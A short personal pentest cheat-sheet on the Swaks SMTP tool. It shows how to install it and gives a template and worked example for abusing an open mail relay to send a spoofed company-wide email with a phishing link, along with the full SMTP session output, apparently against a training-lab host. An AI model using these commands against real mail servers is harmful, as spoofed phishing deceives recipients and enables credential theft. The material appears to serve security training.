---
id: smtp-user-enum
aliases: []
tags: []
---

# Swaks

[Swaks](https://github.com/jetmore/swaks) —
Swiss Army Knife for SMTP

___

<!-- Installation {{{-->
## Installation

[Kali Tools](https://www.kali.org/tools/swaks/)

```sh
sudo apt install swaks
```

___
<!-- }}} -->

<!-- Usage {{{-->
## Usage

Exploit an open relay

```sh
swaks --from <relay_email> \
      --to <target_emails> \
      --header 'Subject: <subject>' \
      --body '<body>' \
      --server <server_ip>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> swaks --from notifications@inlanefreight.com \
>       --to employees@inlanefreight.com \
>       --header 'Subject: Company Notification' \
>       --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \
>       --server 10.10.11.213
> ```
>
> ```sh
> === Trying 10.10.11.213:25...
> === Connected to 10.10.11.213.
> <-  220 mail.localdomain SMTP Mailer ready
>  -> EHLO parrot
> <-  250-mail.localdomain
> <-  250-SIZE 33554432
> <-  250-8BITMIME
> <-  250-STARTTLS
> <-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
> <-  250 HELP
>  -> MAIL FROM:<notifications@inlanefreight.com>
> <-  250 OK
>  -> RCPT TO:<employees@inlanefreight.com>
> <-  250 OK
>  -> DATA
> <-  354 End data with <CR><LF>.<CR><LF>
>  -> Date: Thu, 29 Oct 2020 01:36:06 -0400
>  -> To: employees@inlanefreight.com
>  -> From: notifications@inlanefreight.com
>  -> Subject: Company Notification
>  -> Message-Id: <20201029013606.775675@parrot>
>  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
>  ->
>  -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
>  ->
>  ->
>  -> .
> <-  250 OK
>  -> QUIT
> <-  221 Bye
> === Connection closed with remote host.
> ```
<!-- }}} -->

____
<!-- }}} -->
